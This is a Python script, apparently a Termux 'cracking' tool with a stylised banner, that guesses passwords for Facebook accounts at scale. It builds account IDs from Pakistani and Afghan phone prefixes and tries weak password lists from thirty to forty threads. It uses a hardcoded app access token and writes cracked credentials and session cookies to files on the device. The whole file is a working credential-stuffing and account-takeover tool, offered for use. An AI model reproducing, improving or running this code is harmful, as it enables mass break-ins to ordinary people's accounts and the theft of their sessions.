...
#SCRIPT GIFT BY AMMU
#GITHUB : https://github.com/AMMU3987
...
try:
        ...
        from string import *
        from concurrent.futures import ThreadPoolExecutor as AMMU
        from concurrent.futures import ThreadPoolExecutor as tred
...
def clear():
        os.system('clear')
print(f'\033[1;91m[\033[1;92m●\033[1;91m]\x1b[38;5;46m WELCOME TO MAFIA KING TOOL')
try:
...
\033[1;93m┗━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m DEVELOPER   :  MAFIA RAYESS
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m FACEBOOK    :  MAFIA RAYESS
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m PADOSAN     :  ZOYA 🍒
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m GITHUB      :  MAFIA RAYESS
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m VERSION     :  0.1
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m TOOL        :  \033[1;34mFILE-/RANDOM\033[1;32m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FOLLOW FACEBOOK    :  \033[1;91m\033[1;41m\033[1;33mAAT FREE CAMMANDS 2024\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m"""
os.system('clear')
print(logo)
...
def menu():
    ...
    print(f"""\033[1;31m[\033[1;37m6\033[1;31m] \033[0;94mCONTACT WITH AMMU""")
    print("""\033[1;31m[\033[1;37m0\033[1;31m] \033[0;91mEXIT""")
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    AMMU = input('\033[1;31m[\033[1;37m?\033[1;31m] \033[1;32mCHOOSE\033[1;37m :\033[0;95m ')
    clear()
    print(logo)
    if AMMU in ['1']:
        crack_file()
...
#       line()
       ...
       with AMMU(max_workers=40) as skber:
#           fresh()
           os.system('clear')
           print(logo)
...
def pakistan():
		...
		with tred(max_workers=30) as habib:	
			...
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122','malik12345']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
...
def afghanistan():
		...
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE : 9370 | 9378 | 9379 | 9377')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		code = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
		os.system('clear')
		print(logo)
		...
		with tred(max_workers=30) as habib:	
			...
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786','۱۲۳۴۵۶']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
...
def rndm1(uid,passlist):
        ...
        sys.stdout.write(f'\r\r{B}[{G}AMMU-M1{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{R}[{G}AMMU-OK{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{Y}[{G}COOKIE{Y}] {G2}●{X1} "+coki)
                                        open('/sdcard/AMMU-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}[{Y}AMMU-CP{B}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AMMU-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
...
def rndm2(uid,passlist):
        ...
        global oks
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f'\r\r{B}[{G}AMMU-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def rndm3(uid,passlist):
        ...
        global oks
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f'\r\r{B}[{G}AMMU-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
                print(f"\r{R}[{R}AMMU-OK{R}]{R} {uid} | {pw}")
                open("/sdcard/AMMU-ok.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          	
            	print(f"\r{R}[{G1}AMMU-OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/AMMU-cp.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r{R}[{G1}AMMU-2F{R}]{G1} {uid} | {pw}")
            	open("/sdcard/AMMU-2f.txt","a").write(uid+"|"+pw+"\n")
            	cps.append(uid)
            	break
            else:continue
        loop+=1
...
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mAMMU•M1\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[1;96m[AMMU-2F] \x1b[38;5;205m {idf} | {pw}')
                ...
                print(f'\r\x1b[1;96m[AMMU-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mAMMU•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
...
def cracktouch(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mAMMU•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
